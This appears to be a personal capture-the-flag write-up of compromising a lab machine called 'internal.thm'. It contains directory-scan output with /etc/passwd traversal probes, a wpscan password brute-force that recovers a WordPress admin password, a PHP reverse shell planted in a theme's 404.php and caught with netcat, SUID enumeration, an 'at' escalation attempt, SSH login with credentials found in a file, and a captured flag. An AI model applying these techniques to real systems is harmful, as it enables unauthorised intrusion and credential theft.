                                                                              
[08:43:38] Starting: blog/wp-includes/blocks/                                                                                       
                                                                              
[08:44:26] Starting: blog/wp-includes/css/                                                                                          
[08:44:46] 301 -  330B  - /blog/wp-includes/css/dist  ->  http://10.10.45.58/blog/wp-includes/css/dist/
Added to the queue: blog/wp-includes/css/dist/
                                                                              
[08:45:11] Starting: blog/wp-includes/fonts/                                                                                        
                                                                              
[08:45:58] Starting: blog/wp-includes/images/                                                                                       
[08:46:22] 301 -  334B  - /blog/wp-includes/images/media  ->  http://10.10.45.58/blog/wp-includes/images/media/
Added to the queue: blog/wp-includes/images/media/
[08:46:31] 301 -  336B  - /blog/wp-includes/images/smilies  ->  http://10.10.45.58/blog/wp-includes/images/smilies/
Added to the queue: blog/wp-includes/images/smilies/
                                                                              
[08:46:39] Starting: blog/wp-includes/js/                                                                                           
[08:46:56] 301 -  329B  - /blog/wp-includes/js/dist  ->  http://10.10.45.58/blog/wp-includes/js/dist/
Added to the queue: blog/wp-includes/js/dist/
[08:47:09] 301 -  333B  - /blog/wp-includes/js/plupload  ->  http://10.10.45.58/blog/wp-includes/js/plupload/
Added to the queue: blog/wp-includes/js/plupload/                            
[08:47:14] 200 -    4KB - /blog/wp-includes/js/swfobject.js                  
[08:47:14] 301 -  334B  - /blog/wp-includes/js/swfupload  ->  http://10.10.45.58/blog/wp-includes/js/swfupload/
Added to the queue: blog/wp-includes/js/swfupload/
                                                                              
[08:47:21] Starting: blog/wp-includes/js/tinymce/                                                                                   
[08:47:44] 200 -    9KB - /blog/wp-includes/js/tinymce/license.txt           
[08:47:50] 301 -  340B  - /blog/wp-includes/js/tinymce/plugins  ->  http://10.10.45.58/blog/wp-includes/js/tinymce/plugins/
Added to the queue: blog/wp-includes/js/tinymce/plugins/
[08:47:54] 301 -  338B  - /blog/wp-includes/js/tinymce/skins  ->  http://10.10.45.58/blog/wp-includes/js/tinymce/skins/
Added to the queue: blog/wp-includes/js/tinymce/skins/
[08:47:57] 301 -  339B  - /blog/wp-includes/js/tinymce/themes  ->  http://10.10.45.58/blog/wp-includes/js/tinymce/themes/
Added to the queue: blog/wp-includes/js/tinymce/themes/
[08:47:58] 301 -  338B  - /blog/wp-includes/js/tinymce/utils  ->  http://10.10.45.58/blog/wp-includes/js/tinymce/utils/
Added to the queue: blog/wp-includes/js/tinymce/utils/
                                                                              
[08:48:03] Starting: phpmyadmin/doc/html/                                                                                           
[08:48:41] 200 -    2KB - /phpmyadmin/doc/html/user.html                     
                                                                              
[08:48:46] Starting: phpmyadmin/setup/lib/fckeditor/                                                                                
[08:48:48] 404 -  273B  - /phpmyadmin/setup/lib/fckeditor/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[08:49:00] 404 -  273B  - /phpmyadmin/setup/lib/fckeditor/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
                                                                              
[08:49:28] Starting: phpmyadmin/setup/lib/tiny_mce/                                                                                 
[08:49:30] 404 -  273B  - /phpmyadmin/setup/lib/tiny_mce/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[08:49:43] 404 -  273B  - /phpmyadmin/setup/lib/tiny_mce/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
                                                                              
[08:50:10] Starting: phpmyadmin/setup/lib/bundler/man/                                                                              
[08:50:12] 404 -  273B  - /phpmyadmin/setup/lib/bundler/man/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[08:50:24] 401 -  458B  - /phpmyadmin/setup/lib/bundler/man/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
                                                                              
[08:50:51] Starting: phpmyadmin/setup/lib/tinymce/                                                                                  
[08:50:53] 404 -  273B  - /phpmyadmin/setup/lib/tinymce/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
[08:51:05] 404 -  273B  - /phpmyadmin/setup/lib/tinymce/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
                                                                              
[08:51:32] Starting: phpmyadmin/setup/lib/                                                                                          
[08:51:35] 401 -  458B  - /phpmyadmin/setup/lib/%2e%2e//google.com           
[08:51:47] 404 -  273B  - /phpmyadmin/setup/lib/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
                                                                              
[08:52:14] Starting: blog/wp-includes/css/dist/                                                                                     
[08:52:29] 301 -  341B  - /blog/wp-includes/css/dist/components  ->  http://10.10.45.58/blog/wp-includes/css/dist/components/
Added to the queue: blog/wp-includes/css/dist/components/
[08:52:32] 301 -  337B  - /blog/wp-includes/css/dist/editor  ->  http://10.10.45.58/blog/wp-includes/css/dist/editor/
Added to the queue: blog/wp-includes/css/dist/editor/
                                                                              
[08:52:56] Starting: blog/wp-includes/images/media/                                                                                 
                                                                              
[08:53:38] Starting: blog/wp-includes/images/smilies/                                                                               
                                                                              
[08:54:20] Starting: blog/wp-includes/js/dist/                                                                                      
                                                                              
[08:55:01] Starting: blog/wp-includes/js/plupload/                                                                                  
[08:55:23] 200 -    7KB - /blog/wp-includes/js/plupload/license.txt          
                                                                              
[08:55:41] Starting: blog/wp-includes/js/swfupload/                                                                                 
[08:56:03] 200 -  844B  - /blog/wp-includes/js/swfupload/license.txt         
                                                                              
[08:56:21] Starting: blog/wp-includes/js/tinymce/plugins/                                                                           
[08:56:42] 301 -  346B  - /blog/wp-includes/js/tinymce/plugins/image  ->  http://10.10.45.58/blog/wp-includes/js/tinymce/plugins/image/
Added to the queue: blog/wp-includes/js/tinymce/plugins/image/
[08:56:44] 301 -  345B  - /blog/wp-includes/js/tinymce/plugins/link  ->  http://10.10.45.58/blog/wp-includes/js/tinymce/plugins/link/
Added to the queue: blog/wp-includes/js/tinymce/plugins/link/
[08:56:44] 301 -  346B  - /blog/wp-includes/js/tinymce/plugins/lists  ->  http://10.10.45.58/blog/wp-includes/js/tinymce/plugins/lists/
Added to the queue: blog/wp-includes/js/tinymce/plugins/lists/
[08:56:45] 301 -  346B  - /blog/wp-includes/js/tinymce/plugins/media  ->  http://10.10.45.58/blog/wp-includes/js/tinymce/plugins/media/
Added to the queue: blog/wp-includes/js/tinymce/plugins/media/
                                                                              
[08:57:02] Starting: blog/wp-includes/js/tinymce/skins/                                                                             
                                                                              
[08:57:45] Starting: blog/wp-includes/js/tinymce/themes/                                                                            
                                                                              
[08:58:27] Starting: blog/wp-includes/js/tinymce/utils/                                                                             
                                                                              
[08:59:09] Starting: blog/wp-includes/css/dist/components/                                                                          
                                                                              
[08:59:52] Starting: blog/wp-includes/css/dist/editor/                                                                              
                                                                              
[09:00:34] Starting: blog/wp-includes/js/tinymce/plugins/image/                                                                     
                                                                              
[09:01:15] Starting: blog/wp-includes/js/tinymce/plugins/link/                                                                      
                                                                              
[09:01:57] Starting: blog/wp-includes/js/tinymce/plugins/lists/                                                                     
                                                                              
[09:02:39] Starting: blog/wp-includes/js/tinymce/plugins/media/                                                                     
                                                                              
Task Completed                                                                                                                      
                                                                    
```


So just sitting her for 15 mins watching it I see some interesting directories go by.  I tried the http://internal.thm/ and get a picture on a blank page. Looks like a placeholder. 

Another one however, wp-admin. As someone that does a lot of wordpress sites I know a lot of the ins and outs there. I'll poke around there 1st.

Let's scan it first and see what we can find.

```
└─$ wpscan --url http://10.10.45.58/blog -e vp,u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.45.58/blog/ [10.10.45.58]
[+] Started: Tue Oct 25 08:47:16 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.45.58/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.45.58/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.45.58/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.45.58/blog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.4.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.45.58/blog/, Match: 'WordPress 5.4.2'

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <======================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Oct 25 08:47:32 2022
[+] Requests Done: 48
[+] Cached Requests: 5
[+] Data Sent: 11.8 KB
[+] Data Received: 302.942 KB
[+] Memory used: 204.488 MB
[+] Elapsed time: 00:00:16
```

Ok so we found an admin user.  We can try fuzzing that and see if we can find the login via brute force providing they aren't running wordfence or some other WAP.

--(break)--

Ok going to need to Bruteforce WPress since I don't see any exploits for this version/site.

```
root@ip-10-10-100-18:~# wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]N
[+] URL: http://internal.thm/blog/ [10.10.240.218]
[+] Started: Tue Oct 25 08:19:13 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://internal.thm/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://internal.thm/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://internal.thm/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://internal.thm/blog/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://internal.thm/blog/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/
 | Last Updated: 2021-03-09T00:00:00.000Z
 | Readme: http://internal.thm/blog/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://internal.thm/blog/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <===> (22 / 22) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
Trying admin / 1234567890 Time: 00:00:00 <> (45 / 14344391)  0.00%  ETA: 54:59:2Trying admin / basketball Time: 00:00:00 <> (50 / 14344391)  0.00%  ETA: 54:02:1Trying admin / alexander Time: 00:00:01 <> (115 / 14344391)  0.00%  ETA: 49:35:1Trying admin / stephanie Time: 00:00:01 <> (160 / 14344391)  0.00%  ETA: 48:30:2Trying admin / hellokitty Time: 00:00:02 <> (215 / 14344391)  0.00%  ETA: 49:10:Trying admin / christopher Time: 00:00:03 <> (265 / 14344391)  0.00%  ETA: 48:50Trying admin / superstar Time: 00:00:04 <> (335 / 14344391)  0.00%  ETA: 48:37:3Trying 

[...] cut for brevity [...]

ETA: 49:23:1Trying admin / astonvilla Time: 00:00:47 <> (3865 / 14344391)  0.02%  ETA: 49:23[SUCCESS] - admin / my2boys                                                     
Trying admin / bratz1 Time: 00:00:48 < > (3885 / 14348276)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Tue Oct 25 08:20:25 2022
[+] Requests Done: 3910
[+] Cached Requests: 33
[+] Data Sent: 1.906 MB
[+] Data Received: 2.291 MB
[+] Memory used: 254.965 MB
[+] Elapsed time: 00:01:11

```

So now we can just login as Admin on the Wordpress site and upload the standard php-reverse-shell.php

I navigate to Wordpress->Appearance->Theme Editor and pick the 404.php page and put the code for the shell at the top, pushing the rest of the code down and then click update.

Next I setup a listener:
```
root@ip-10-10-100-18:~# nc -lnvp 5555
Listening on [0.0.0.0] (family 0, port 5555)

```

Now I simply curl the 404.php:

```
</body></html>
root@ip-10-10-100-18:~# curl http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php

```

and catch the shell:

```
Connection from 10.10.240.218 36668 received!
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 07:58:50 up  1:34,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 

```

Not finding much under this user. I found one user there but it's inaccessible so far.

Trying to find some SUID binaries:

```
$ find / -perm /4000 2>/dev/null
/snap/core/9665/bin/mount
/snap/core/9665/bin/ping
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/snap/core/9665/usr/bin/chfn
/snap/core/9665/usr/bin/chsh
/snap/core/9665/usr/bin/gpasswd
/snap/core/9665/usr/bin/newgrp
/snap/core/9665/usr/bin/passwd
/snap/core/9665/usr/bin/sudo
/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9665/usr/lib/openssh/ssh-keysign
/snap/core/9665/usr/lib/snapd/snap-confine
/snap/core/9665/usr/sbin/pppd
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/bin/mount
/bin/umount
/bin/ping
/bin/fusermount
/bin/su
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/at
/usr/bin/sudo
/usr/bin/pkexec
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

```

Trying to escalate using AT:

```
$ echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
sudo: no tty present and no askpass program specified

```

And our shell hangs.

Re-attach. Looking for any files I have world write access to:

```
$ find / -xdev -perm +o=w ! \( -type d -perm +o=t \) ! -type l -print
find: '/opt/containerd': Permission denied
find: '/var/spool/rsyslog': Permission denied
find: '/var/spool/cron/atspool': Permission denied
find: '/var/spool/cron/crontabs': Permission denied
find: '/var/spool/cron/atjobs': Permission denied
find: '/var/log/unattended-upgrades': Permission denied
find: '/var/log/mysql': Permission denied
find: '/var/log/apache2': Permission denied
find: '/var/cache/ldconfig': Permission denied
find: '/var/cache/apt/archives/partial': Permission denied
find: '/var/lib/mysql': Permission denied
find: '/var/lib/containerd': Permission denied
find: '/var/lib/docker': Permission denied
find: '/var/lib/mysql-keyring': Permission denied
find: '/var/lib/update-notifier/package-data-downloads/partial': Permission denied
find: '/var/lib/private': Permission denied
find: '/var/lib/apt/lists/partial': Permission denied
find: '/var/lib/snapd/cache': Permission denied
find: '/var/lib/snapd/void': Permission denied
find: '/var/lib/snapd/cookie': Permission denied
find: '/var/lib/snapd/snapshots': Permission denied
find: '/var/lib/polkit-1': Permission denied
find: '/var/lib/php/sessions': Permission denied
find: '/var/lib/mysql-files': Permission denied
find: '/home/aubreanna': Permission denied
find: '/root': Permission denied
find: '/lost+found': Permission denied
find: '/etc/ssl/private': Permission denied
find: '/etc/lvm/backup': Permission denied
find: '/etc/lvm/archive': Permission denied
find: '/etc/polkit-1/localauthority': Permission denied
$ 
```

Looking for anything.. eumerating ..

After an hour I find this under /opt

```
$ cd /opt
$ ls
containerd
wp-save.txt
$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123

```

Let's see if we can SSH in as aubreanna...

```
root@ip-10-10-235-118:~# ssh aubreanna@10.10.240.218
The authenticity of host '10.10.240.218 (10.10.240.218)' can't be established.
ECDSA key fingerprint is SHA256:fJ/BlTrDF8wS8/eqyoej1aq/NmvQh79ABdkpiiN5tqE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.240.218' (ECDSA) to the list of known hosts.
aubreanna@10.10.240.218's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Oct 25 08:43:40 UTC 2022

  System load:  0.0               Processes:              119
  Usage of /:   63.8% of 8.79GB   Users logged in:        0
  Memory usage: 46%               IP address for eth0:    10.10.240.218
  Swap usage:   0%                IP address for docker0: 172.17.0.1

  => There is 1 zombie process.


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.


Last login: Mon Aug  3 19:56:19 2020 from 10.6.2.56
aubreanna@internal:~$ 

```

ok nice! 

Let's see if she has the user flag:

```
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}
aubreanna@internal:~$ 

```

Ok one flag to go!

Now the next thing I see is a file called jenkins.txt

```
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}
aubreanna@internal:~$ 

```

Just going to see if I can do sudo -l first

```
aubreanna@internal:~$ sudo -l
[sudo] password for aubreanna: 
Sorry, user aubreanna may not run sudo on internal.
```

No that would have been too easy hehe..

ok that Jenkins service looks interesting.. I want to see if there is something running here:

```
aubreanna@internal:~$ ifconfig -a
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:62ff:fe51:7fe4  prefixlen 64  scopeid 0x20<link>
        ether 02:42:62:51:7f:e4  txqueuelen 0  (Ethernet)
        RX packets 8  bytes 420 (420.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1464 (1.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

Well there does seem to be something on that network

ssh -f -N -L 1234:127:0.0.1:8080 aubreanna@internal.thm